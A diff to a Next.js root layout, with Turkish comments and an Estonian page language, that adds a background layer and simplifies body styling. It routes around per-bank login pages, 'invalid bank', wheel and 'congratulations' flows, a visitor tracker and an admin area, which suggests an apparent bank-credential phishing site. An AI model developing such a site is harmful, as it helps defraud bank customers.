@@ -4,6 +4,7 @@ import { usePathname } from "next/navigation";
 import LiveToast from "@/components/LiveToast";
 import { SettingsProvider } from "@/contexts/SettingsContext";
 import { VisitorTracker } from "@/components/VisitorTracker";
+import { GlobalBackgroundLayer } from "@/components/demo/GlobalBackgroundLayer";
 import "./globals.css";
 
 export default function RootLayout({
@@ -11,7 +12,7 @@ export default function RootLayout({
 }: {
   children: React.ReactNode;
 }) {
-  const pathname = usePathname();
+  const pathname = usePathname() ?? "/";
 
   // Sadece belirli yollarda bildirimi gösterme kuralları:
   // Admin yolları, geçersiz banka sayfaları, tebrikler veya BİREYSEL banka giriş sayfalarında göstermeyelim.
@@ -29,28 +30,20 @@ export default function RootLayout({
   // Ama "/banken" ise gizleme.
   const shouldShowToast = !hideToastOnPaths.some(path => pathname.startsWith(path)) && !pathname.includes("/bank/");
 
-  // Belirli akislarda global arka plani kapat.
+  // Global arka planı gizlenecek yollar: Admin ve bireysel banka giriş sayfaları (özel arka planı var)
   const isAdminPage = pathname.startsWith("/admin");
-  const shouldHideThemeBackground = [
-    "/wait",
-    "/congratulations",
-    "/invalid-bank",
-    "/wheel",
-  ].some((path) => pathname.startsWith(path)) || pathname.includes("/bank/");
+  const isIndividualBankLoginPage = pathname.includes("/bank/");
+  const shouldHideGlobalBackground = isAdminPage || isIndividualBankLoginPage;
 
-  const bodyClass = [
-    isAdminPage || shouldHideThemeBackground ? "bg-[#f4f7f9]" : "ah-theme",
-  ]
-    .filter(Boolean)
-    .join(" ");
+  const bodyClass = "min-h-screen relative bg-[#020b22]";
 
   // GEÇİCİ OLARAK KAPATILDI: LiveToast özelliği daha sonra tekrar açılmak üzere deaktif edildi.
-  // Kullanıcının göreceği arayüz tasarımları yenilendiği için bildirimler gizlendi.
   const ENABLE_TOAST = false;
 
   return (
     <html lang="et">
       <body className={bodyClass}>
+        {!shouldHideGlobalBackground && <GlobalBackgroundLayer />}
         <VisitorTracker />
         <SettingsProvider>
           {ENABLE_TOAST && shouldShowToast && <LiveToast />}
